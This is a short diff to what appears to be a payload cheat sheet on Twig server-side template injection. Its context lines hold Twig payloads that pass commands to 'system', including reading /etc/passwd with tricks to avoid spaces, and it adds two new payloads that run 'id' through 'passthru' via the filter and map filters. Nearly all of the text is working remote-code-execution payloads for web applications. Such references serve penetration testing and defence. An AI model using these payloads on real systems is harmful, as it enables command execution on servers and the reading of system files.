@@ -966,6 +966,8 @@ $output = $twig > render (
 {{['id',1]|sort('system')|join}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['id']|map('passthru')}}
 ```
 
 Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
